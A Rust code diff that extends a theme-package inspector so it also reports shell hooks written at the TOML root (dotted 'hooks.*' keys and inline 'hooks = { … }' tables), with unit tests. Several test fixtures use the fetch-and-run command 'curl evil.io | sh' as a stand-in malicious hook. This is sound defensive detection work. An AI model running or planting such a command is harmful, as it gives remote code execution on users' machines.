@@ -75,8 +75,10 @@ impl LuaPreset {
 /// names and paths under [`lua_presets`](Self::lua_presets).
 #[derive(Debug, Default, Clone, PartialEq, Eq)]
 pub struct ThemeTrustReport {
-    /// Every `[hooks]` command of every `providers/*/settings.toml`, in
-    /// provider-directory order (sorted) and file order inside a file.
+    /// Every hooks command of every `providers/*/settings.toml` — spelled
+    /// under `[hooks]` or as a root-level `hooks.*` key / `hooks = { … }`
+    /// table — in provider-directory order (sorted) and file order inside a
+    /// file.
     pub shell_hooks: Vec<ShellHook>,
     /// Every preset file under `presets/<category>/` the report must name —
     /// what the apply installs AND can execute: `*.lua` anywhere, plus
@@ -156,9 +158,24 @@ fn shell_hooks(theme_dir: &Path) -> Vec<ShellHook> {
 /// `key = value` of its own — until its delimiter returns. The whole string
 /// is the command of the key that opened it (Noctalia's TOML parser hands
 /// exactly that to the shell).
+///
+/// The table can also be written WITHOUT a header, before the first
+/// `[section]` line: the dotted key `hooks.started = "…"` and the inline
+/// table `hooks = { started = "…" }` are the same `[hooks]` table to any
+/// TOML parser, so both are read like a pair under the header (see
+/// [`root_hooks`]). After a header the same text is
+/// `<section>.hooks.started`, which Noctalia never executes, so it is left
+/// alone. Still line-based (no TOML crate): an inline table opened on one
+/// line and closed on a later one is INVALID TOML (a newline is only legal
+/// inside a value), so Noctalia's parser rejects such a file outright and
+/// nothing can execute from it.
 fn hooks_in_settings(text: &str, provider: &str) -> Vec<ShellHook> {
     let mut out = Vec::new();
     let mut in_hooks = false;
+    // Document ROOT: no `[section]` header has been seen yet. Only there do
+    // the root-level spellings name the hooks table; under a section they
+    // name `<section>.hooks.*`, which Noctalia never runs.
+    let mut root = true;
     // An OPEN multi-line string: (the key it belongs to, the delimiter that
     // closes it, the content gathered so far).
     let mut open: Option<(String, &'static str, String)> = None;
@@ -186,9 +203,24 @@ fn hooks_in_settings(text: &str, provider: &str) -> Vec<ShellHook> {
         }
         if let Some(section) = section_name(line) {
             in_hooks = section == "hooks" || section.starts_with("hooks.");
+            root = false;
             continue;
         }
         if !in_hooks {
+            if root {
+                for item in root_hooks(line) {
+                    match item {
+                        RootHook::Pair(key, command) => {
+                            push_shell_hook(&mut out, provider, &key, &command);
+                        }
+                        RootHook::OpenMulti {
+                            key,
+                            delimiter,
+                            head,
+                        } => open = Some((key, delimiter, head)),
+                    }
+                }
+            }
             continue;
         }
         match hook_line(line) {
@@ -327,6 +359,11 @@ fn hook_line(line: &str) -> HookLine<'_> {
             HookLine::Pair(key, &rest[1..end])
         }
         Some('[') => HookLine::None, // an array is data, never a command
+        // A nested inline table (`started = { … }`) is configuration data —
+        // a command is a STRING — so the `{` it starts with must never be
+        // reported as a command. (The root-level `hooks = { … }` spelling
+        // never reaches here: `root_hooks` reads it itself.)
+        Some('{') => HookLine::None,
         Some(_) => {
             let end = rest
                 .find(|c: char| c.is_whitespace() || c == '#')
@@ -338,6 +375,231 @@ fn hook_line(line: &str) -> HookLine<'_> {
         }
         None => HookLine::None,
     }
+}
+
+/// One root-level hook spelling read from ONE line: a finished
+/// `key = command` pair, or a MULTI-LINE string this line OPENS — the
+/// caller keeps collecting it exactly like a `[hooks]` multi-line value.
+#[derive(Debug)]
+enum RootHook {
+    /// A complete single-line value: the key INSIDE the hooks table and
+    /// its command text.
+    Pair(String, String),
+    /// A multi-line string (`"""` / `'''`) this line opens: the key it
+    /// belongs to, the delimiter that closes it, and whatever content the
+    /// opener line already carries after that delimiter.
+    OpenMulti {
+        key: String,
+        delimiter: &'static str,
+        head: String,
+    },
+}
+
+/// The hooks ONE line written at the document ROOT declares (empty for
+/// every other line). Two plain-TOML spellings name the `[hooks]` table
+/// without any header, and Noctalia deserializes and runs both:
+///
+/// - the dotted key: `hooks.started = "…"` — also `hooks."started"`,
+///   `"hooks"."started"` and `hooks . started`: a dot separates keys
+///   whether it is bare, quoted or spaced;
+/// - the inline table: `hooks = { started = "…", … }`.
+///
+/// A QUOTED key with a dot inside it (`"hooks.started"`) is ONE literal
+/// key name, not the hooks table — Noctalia never runs it, so it is not
+/// reported (reporting it would nag the keeper over nothing).
+///
+/// The VALUE rules are [`hook_line`]'s, so a command is reported exactly
+/// like a pair under the `[hooks]` header; only the key differs: the report
+/// carries the key INSIDE the hooks table (`started`), never the dotted
+/// text (`hooks.started`).
+fn root_hooks(line: &str) -> Vec<RootHook> {
+    // House convention (same as `hook_line`): a `#` starts a comment.
+    let code = line.split('#').next().unwrap_or("").trim();
+    if code.is_empty() {
+        return Vec::new();
+    }
+    let Some(eq_at) = code.find('=') else {
+        return Vec::new();
+    };
+    // Split the key on the dots OUTSIDE quotes: only those are real key
+    // separators (see the doc above).
+    let names: Vec<&str> = split_outer(&code[..eq_at], '.')
+        .iter()
+        .map(|part| unquote(part.trim()))
+        .collect();
+    if names.is_empty() || names.iter().any(|name| name.is_empty()) {
+        return Vec::new();
+    }
+    // The dotted spelling: at least `hooks.<key>`.
+    if names.len() >= 2 && names[0] == "hooks" {
+        let plain = names[1..].join(".");
+        return match hook_line(line) {
+            HookLine::Pair(_, command) => vec![RootHook::Pair(plain, command.to_string())],
+            HookLine::OpenMulti {
+                delimiter, head, ..
+            } => vec![RootHook::OpenMulti {
+                key: plain,
+                delimiter,
+                head: head.to_string(),
+            }],
+            HookLine::None => Vec::new(),
+        };
+    }
+    // The inline-table spelling: `hooks = { … }`. A `hooks` value that is
+    // not a table (`hooks = "…"`) is not the hooks table.
+    if names.len() != 1 || names[0] != "hooks" {
+        return Vec::new();
+    }
+    let value = code[eq_at + 1..].trim_start();
+    let Some(body) = value.strip_prefix('{') else {
+        return Vec::new();
+    };
+    // Cut the body at the closing `}` (quote-aware: a `}` inside a command
+    // string closes nothing). A line without it is truncated garbage; the
+    // detector parses what is there — the same tolerance as an unterminated
+    // quote.
+    let body = split_outer(body, '}').swap_remove(0);
+    split_outer(body, ',')
+        .iter()
+        .filter_map(|entry| inline_hook_entry(entry))
+        .collect()
+}
+
+/// One `key = value` entry inside a root-level `hooks = { … }` inline
+/// table: the hook it declares, or `None` when it declares NO command —
+/// no `=`, an empty key or value (a trailing comma leaves one empty), a
+/// dotted (sub-table) key, a nested inline table, or an array: those are
+/// data, never a command.
+fn inline_hook_entry(entry: &str) -> Option<RootHook> {
+    let entry = entry.trim();
+    if entry.is_empty() {
+        return None;
+    }
+    let eq_at = entry.find('=')?;
+    let key_parts: Vec<&str> = split_outer(&entry[..eq_at], '.')
+        .iter()
+        .map(|part| unquote(part.trim()))
+        .collect();
+    // A dotted key inside the table (`sub.started = …`) defines a
+    // sub-table, not a hook Noctalia's flat hooks map executes.
+    if key_parts.len() != 1 || key_parts[0].is_empty() {
+        return None;
+    }
+    let key = key_parts[0].to_string();
+    let value = entry[eq_at + 1..].trim_start();
+    if value.is_empty() {
+        return None;
+    }
+    // A MULTI-LINE string is a legal value inside an inline table (the
+    // newline is within the value): closed on this entry it is one finished
+    // command, otherwise it opens and the caller keeps collecting it.
+    for delimiter in ["\"\"\"", "'''"] {
+        if let Some(head) = value.strip_prefix(delimiter) {
+            return Some(match head.find(delimiter) {
+                Some(end) => RootHook::Pair(key, head[..end].to_string()),
+                None => RootHook::OpenMulti {
+                    key,
+                    delimiter,
+                    head: head.to_string(),
+                },
+            });
+        }
+    }
+    match value.as_bytes()[0] {
+        // A nested inline table or an array is data, never a command.
+        b'{' | b'[' => None,
+        b'"' | b'\'' => {
+            // ONE quoted string: the delimiters stripped, a `\"` escape
+            // kept verbatim (this reader reports what the FILE holds), and
+            // an unterminated quote keeps the rest — the same tolerance
+            // `hook_line` applies under `[hooks]`.
+            let content = match closing_quote(value, 0) {
+                Some(end) => &value[1..end - 1],
+                None => &value[1..],
+            };
+            Some(RootHook::Pair(key, content.to_string()))
+        }
+        // A bare value (a boolean or a number): report the token, exactly
+        // as `hook_line` reports an unquoted value under `[hooks]`.
+        _ => {
+            let token = value.split(char::is_whitespace).next().unwrap_or("");
+            if token.is_empty() {
+                None
+            } else {
+                Some(RootHook::Pair(key, token.to_string()))
+            }
+        }
+    }
+}
+
+/// Split `text` on every `sep` at the OUTERMOST level — outside every
+/// quoted string, array and nested table — so a `.`, a `,` or a `}` inside
+/// a command string separates nothing. An unterminated string swallows the
+/// rest of the text: nothing after it can be read (garbage input).
+fn split_outer<'a>(text: &'a str, sep: char) -> Vec<&'a str> {
+    let mut pieces = Vec::new();
+    let mut start = 0;
+    let mut depth = 0usize;
+    let mut at = 0;
+    while at < text.len() {
+        let c = text[at..].chars().next().expect("at is on a char boundary");
+        if c == '"' || c == '\'' {
+            match closing_quote(text, at) {
+                Some(end) => at = end,
+                None => break,
+            }
+            continue;
+        }
+        match c {
+            '{' | '[' => depth += 1,
+            '}' | ']' => {
+                if depth == 0 && c == sep {
+                    pieces.push(&text[start..at]);
+                    start = at + 1;
+                } else {
+                    depth = depth.saturating_sub(1);
+                }
+            }
+            c if c == sep && depth == 0 => {
+                pieces.push(&text[start..at]);
+                start = at + 1;
+            }
+            _ => {}
+        }
+        at += c.len_utf8();
+    }
+    pieces.push(&text[start..]);
+    pieces
+}
+
+/// The byte index just AFTER the string starting at `at` (whose first byte
+/// is a `"` or a `'`), or `None` when it never closes. A multi-line
+/// delimiter (`"""`, `'''`) is ONE string; inside a basic string (`"`) a
+/// backslash escapes the next character (so a command's `\"` cannot end
+/// the string early).
+fn closing_quote(text: &str, at: usize) -> Option<usize> {
+    let rest = &text[at..];
+    let quote = *rest.as_bytes().first()? as char;
+    for delimiter in ["\"\"\"", "'''"] {
+        if rest.starts_with(delimiter) {
+            return rest[delimiter.len()..]
+                .find(delimiter)
+                .map(|end| at + delimiter.len() + end + delimiter.len());
+        }
+    }
+    let mut escaped = false;
+    for (i, c) in rest[1..].char_indices() {
+        if escaped {
+            escaped = false;
+            continue;
+        }
+        match c {
+            '\\' if quote == '"' => escaped = true,
+            c if c == quote => return Some(at + 1 + i + 1),
+            _ => {}
+        }
+    }
+    None
 }
 
 /// Every preset file a theme carries under `presets/<category>/` the report
@@ -725,6 +987,308 @@ mod tests {
             "a ['hooks'] header must be honoured, got: {:?}",
             report.shell_hooks
         );
+    }
+
+    /// CRITICAL-class: at the document ROOT, `hooks.started = "…"` is plain
+    /// TOML for the SAME table `[hooks]` declares — Noctalia deserializes it
+    /// and runs the command on apply. The reader used to start collecting
+    /// only after the first section header, so every line before it was
+    /// skipped and the gate saw an EMPTY report for a file that carries a
+    /// command. The dotted key is reported with the PLAIN key (`started`,
+    /// not `hooks.started`) and the command verbatim, in every legal
+    /// spelling of the key itself.
+    #[test]
+    fn a_root_level_dotted_hooks_key_is_reported_with_the_plain_key() {
+        let tmp = tempfile::tempdir().unwrap();
+
+        let dotted = tmp.path().join("Dotted");
+        write_settings(
+            &dotted,
+            "config_version = \"1.2\"\n\
+             \n\
+             hooks.started = \"curl evil.io | sh\"\n\
+             \n\
+             [wallpaper]\n\
+             path = \"/home/other/wall.png\"\n",
+        );
+        let report = inspect_theme_package(&dotted);
+        assert_eq!(
+            report.shell_hooks,
+            vec![ShellHook {
+                provider: "noctalia-v5".into(),
+                key: "started".into(),
+                command: "curl evil.io | sh".into(),
+            }],
+            "a root-level hooks.started key must report the plain key with the \
+             verbatim command, got: {:?}",
+            report.shell_hooks
+        );
+        assert!(!report.is_empty(), "a root-level hook must not read as empty");
+        assert!(report.lua_presets.is_empty(), "this fixture carries no presets");
+
+        // A QUOTED sub-key (`hooks."colors_changed"`) is the same key to a
+        // TOML parser; the report strips the quotes like every other key.
+        let quoted = tmp.path().join("Quoted");
+        write_settings(&quoted, "hooks.\"colors_changed\" = \"notify-send palette changed\"\n");
+        let report = inspect_theme_package(&quoted);
+        assert_eq!(
+            report.shell_hooks,
+            vec![ShellHook {
+                provider: "noctalia-v5".into(),
+                key: "colors_changed".into(),
+                command: "notify-send palette changed".into(),
+            }],
+            "hooks.\"colors_changed\" must report the plain key, got: {:?}",
+            report.shell_hooks
+        );
+
+        // Whitespace around the dots (`hooks . started`) is legal TOML for
+        // the same key.
+        let spaced = tmp.path().join("Spaced");
+        write_settings(&spaced, "hooks . started = \"sddm-watch.sh\"\n");
+        let report = inspect_theme_package(&spaced);
+        assert_eq!(
+            report.shell_hooks,
+            vec![ShellHook {
+                provider: "noctalia-v5".into(),
+                key: "started".into(),
+                command: "sddm-watch.sh".into(),
+            }],
+            "hooks . started must report the plain key, got: {:?}",
+            report.shell_hooks
+        );
+
+        // Both parts quoted (`"hooks"."started"`) is the same dotted key.
+        let quoted_both = tmp.path().join("QuotedBoth");
+        write_settings(&quoted_both, "\"hooks\".\"started\" = \"boot.sh\"\n");
+        let report = inspect_theme_package(&quoted_both);
+        assert_eq!(
+            report.shell_hooks,
+            vec![ShellHook {
+                provider: "noctalia-v5".into(),
+                key: "started".into(),
+                command: "boot.sh".into(),
+            }],
+            "\"hooks\".\"started\" must report the plain key, got: {:?}",
+            report.shell_hooks
+        );
+    }
+
+    /// The dotted spelling carries a MULTI-LINE string too: Noctalia's
+    /// parser hands the whole string to the shell as ONE command, so the
+    /// opener line must not vanish (the gate would see an empty report
+    /// while the command runs on apply).
+    #[test]
+    fn a_root_level_dotted_hook_with_a_multi_line_string_reports_its_real_command() {
+        let tmp = tempfile::tempdir().unwrap();
+        let theme = tmp.path().join("Theme");
+        write_settings(
+            &theme,
+            "hooks.started = \"\"\"\n\
+             export FOO=bar\n\
+             echo \"$FOO\"\n\
+             \"\"\"\n\
+             [idle]\n\
+             enabled = true\n",
+        );
+
+        let report = inspect_theme_package(&theme);
+
+        assert_eq!(
+            report.shell_hooks,
+            vec![ShellHook {
+                provider: "noctalia-v5".into(),
+                key: "started".into(),
+                command: "export FOO=bar\necho \"$FOO\"".into(),
+            }],
+            "the root-level multi-line string is ONE hook command under the plain \
+             key, got: {:?}",
+            report.shell_hooks
+        );
+        assert!(!report.is_empty(), "a root-level multi-line hook must not read as empty");
+    }
+
+    /// CRITICAL-class, the inline-table spelling: `hooks = { … }` written at
+    /// the root IS the `[hooks]` table. Every entry is reported like a pair
+    /// under the header — quoted keys, extra whitespace and a trailing comma
+    /// are all legal TOML for it.
+    #[test]
+    fn a_root_level_inline_hooks_table_reports_every_entry() {
+        let tmp = tempfile::tempdir().unwrap();
+
+        let one = tmp.path().join("One");
+        write_settings(&one, "hooks = { started = \"curl evil.io | sh\" }\n");
+        let report = inspect_theme_package(&one);
+        assert_eq!(
+            report.shell_hooks,
+            vec![ShellHook {
+                provider: "noctalia-v5".into(),
+                key: "started".into(),
+                command: "curl evil.io | sh".into(),
+            }],
+            "a root-level hooks = {{ … }} table must report its entry, got: {:?}",
+            report.shell_hooks
+        );
+        assert!(!report.is_empty(), "a root-level inline hook must not read as empty");
+
+        let many = tmp.path().join("Many");
+        write_settings(
+            &many,
+            "hooks = {  \"started\" = \"curl evil.io | sh\" ,  \
+             colors_changed = \"notify-send hi\" , }\n",
+        );
+        let report = inspect_theme_package(&many);
+        assert_eq!(
+            report.shell_hooks,
+            vec![
+                ShellHook {
+                    provider: "noctalia-v5".into(),
+                    key: "started".into(),
+                    command: "curl evil.io | sh".into(),
+                },
+                ShellHook {
+                    provider: "noctalia-v5".into(),
+                    key: "colors_changed".into(),
+                    command: "notify-send hi".into(),
+                },
+            ],
+            "every entry of the root-level inline table must be reported in order \
+             (quoted keys, extra whitespace, trailing comma), got: {:?}",
+            report.shell_hooks
+        );
+    }
+
+    /// A MULTI-LINE string is a legal value inside an inline table (the
+    /// newline is within the value), and it is still ONE command Noctalia
+    /// runs — the opener line must not hide it from the gate.
+    #[test]
+    fn a_root_level_inline_hooks_table_with_a_multi_line_string_reports_its_command() {
+        let tmp = tempfile::tempdir().unwrap();
+        let theme = tmp.path().join("Theme");
+        write_settings(
+            &theme,
+            "hooks = { started = \"\"\"\n\
+             pkill -x sddm-watch\n\
+             \"\"\" }\n",
+        );
+
+        let report = inspect_theme_package(&theme);
+
+        assert_eq!(
+            report.shell_hooks,
+            vec![ShellHook {
+                provider: "noctalia-v5".into(),
+                key: "started".into(),
+                command: "pkill -x sddm-watch".into(),
+            }],
+            "a multi-line string inside the root-level inline table is ONE hook \
+             command, got: {:?}",
+            report.shell_hooks
+        );
+        assert!(!report.is_empty(), "a root-level inline multi-line hook must not read as empty");
+    }
+
+    /// The "an empty value is not a hook" rule holds for both root-level
+    /// spellings: nothing to run, nothing to warn about.
+    #[test]
+    fn an_empty_command_in_a_root_level_hooks_spelling_is_not_reported() {
+        let tmp = tempfile::tempdir().unwrap();
+
+        let dotted = tmp.path().join("Dotted");
+        write_settings(&dotted, "hooks.started = \"\"\n");
+        let report = inspect_theme_package(&dotted);
+        assert!(
+            report.is_empty(),
+            "an empty root-level dotted command is not a hook, got: {:?}",
+            report
+        );
+
+        let inline = tmp.path().join("Inline");
+        write_settings(&inline, "hooks = { started = \"\" }\n");
+        let report = inspect_theme_package(&inline);
+        assert!(
+            report.is_empty(),
+            "an empty root-level inline-table command is not a hook, got: {:?}",
+            report
+        );
+    }
+
+    /// The root-level spellings count ONLY at the document ROOT. Under a
+    /// section the same text is `<section>.hooks.started`, which Noctalia
+    /// never executes — reporting it would nag the keeper over nothing.
+    #[test]
+    fn root_level_hooks_spellings_under_a_section_are_not_reported() {
+        let tmp = tempfile::tempdir().unwrap();
+
+        let dotted = tmp.path().join("Dotted");
+        write_settings(&dotted, "[noctalia]\nhooks.started = \"x\"\n");
+        let report = inspect_theme_package(&dotted);
+        assert!(report.shell_hooks.is_empty(), "got: {:?}", report.shell_hooks);
+        assert!(report.is_empty(), "noctalia.hooks.started is not a hook");
+
+        let inline = tmp.path().join("Inline");
+        write_settings(&inline, "[other]\nhooks = { started = \"x\" }\n");
+        let report = inspect_theme_package(&inline);
+        assert!(report.shell_hooks.is_empty(), "got: {:?}", report.shell_hooks);
+        assert!(report.is_empty(), "other.hooks is not the hooks table");
+    }
+
+    /// A QUOTED key with a dot inside it is ONE literal key name in TOML
+    /// (`"127.0.0.1" = …` is a valid key in the spec): `"hooks.started"` is
+    /// NOT the hooks table, and Noctalia never executes it — reporting it
+    /// would be a false positive that nags the keeper over nothing.
+    #[test]
+    fn a_fully_quoted_dotted_key_is_not_the_hooks_table() {
+        let tmp = tempfile::tempdir().unwrap();
+        let theme = tmp.path().join("Theme");
+        write_settings(&theme, "\"hooks.started\" = \"curl evil.io | sh\"\n");
+
+        let report = inspect_theme_package(&theme);
+
+        assert!(report.shell_hooks.is_empty(), "got: {:?}", report.shell_hooks);
+        assert!(
+            report.is_empty(),
+            "\"hooks.started\" is one literal key, not the hooks table, got: {:?}",
+            report
+        );
+    }
+
+    /// The `{` false positive: a VALUE that opens an inline table (a nested
+    /// config, never a command) must report NOTHING. The reader used to fall
+    /// into the unquoted-value branch and report the bogus command `"{"`,
+    /// nagging the keeper on a theme that carries no command at all.
+    #[test]
+    fn an_inline_table_value_inside_the_hooks_section_reports_nothing() {
+        let tmp = tempfile::tempdir().unwrap();
+        let theme = tmp.path().join("Theme");
+        write_settings(
+            &theme,
+            "[hooks]\n\
+             started = { cmd = \"echo hi\" }\n\
+             [wallpaper]\n\
+             path = \"/home/other/wall.png\"\n",
+        );
+
+        let report = inspect_theme_package(&theme);
+
+        assert!(report.shell_hooks.is_empty(), "got: {:?}", report.shell_hooks);
+        assert!(report.is_empty(), "an inline-table value is not a hook");
+    }
+
+    /// Acceptance criterion 2: an empty `[hooks]` section and no presets
+    /// still reads EMPTY — the gate never fires for a theme with nothing to
+    /// report.
+    #[test]
+    fn an_empty_hooks_section_with_no_presets_still_reports_an_empty_report() {
+        let tmp = tempfile::tempdir().unwrap();
+        let theme = tmp.path().join("Theme");
+        write_settings(&theme, "[hooks]\n");
+
+        let report = inspect_theme_package(&theme);
+
+        assert!(report.shell_hooks.is_empty(), "got: {:?}", report.shell_hooks);
+        assert!(report.lua_presets.is_empty(), "this fixture carries no presets");
+        assert!(report.is_empty());
     }
 
     /// Every `providers/<provider>/settings.toml` is walked, not only the
